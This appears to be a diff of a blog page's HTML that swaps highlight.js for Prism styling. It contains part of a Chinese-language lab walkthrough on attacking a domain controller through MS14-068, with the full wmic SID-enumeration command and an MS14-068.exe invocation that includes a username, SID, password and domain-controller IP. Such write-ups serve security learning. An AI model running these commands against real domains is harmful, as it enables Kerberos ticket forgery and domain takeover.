@@ -31,7 +31,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.7.2/styles/github-gist.min.css" />
+      
+        
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.27.0/components/themes/prism.min.css" />
+      
+      
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.27.0/components/plugins/line-numbers/prism-line-numbers.min.css" />
+      
     
   
 
@@ -298,11 +306,11 @@
 <p><img src="https://img30.360buyimg.com/pop/jfs/t1/198078/2/13162/69646/616ab0acE3ebf9f7b/8650d7b8ae24ee2f.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <p>没有返回结果就是最好的结果，这意味漏洞没有打补丁,准备生成票据攻击域控</p>
 <p>用mimikatz查看密码，再用查看域用户的sid</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wmic useraccount get name,sid<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">wmic useraccount get name,sid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div>
 
 <p><img src="https://img30.360buyimg.com/pop/jfs/t1/210559/6/5602/64169/616ac83fE4e51bc1b/410eb564ffa525db.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <p>ms14-068需要四个参数，分别是域用户名@域名，域用户sid，域用户密码，域控地址</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">shell c:\Windows\temp\MS14-068.exe -u web@hackbox.com -s S-1-5-21-2005268815-658469957-1189185684-1103 -p !@#Qwe456 -d 10.10.10.149<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">shell c:\Windows\temp\MS14-068.exe -u web@hackbox.com -s S-1-5-21-2005268815-658469957-1189185684-1103 -p !@#Qwe456 -d 10.10.10.149<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div>
 
 
             </div>
@@ -528,6 +536,8 @@
 
 
 
+  
+    
   
 
 
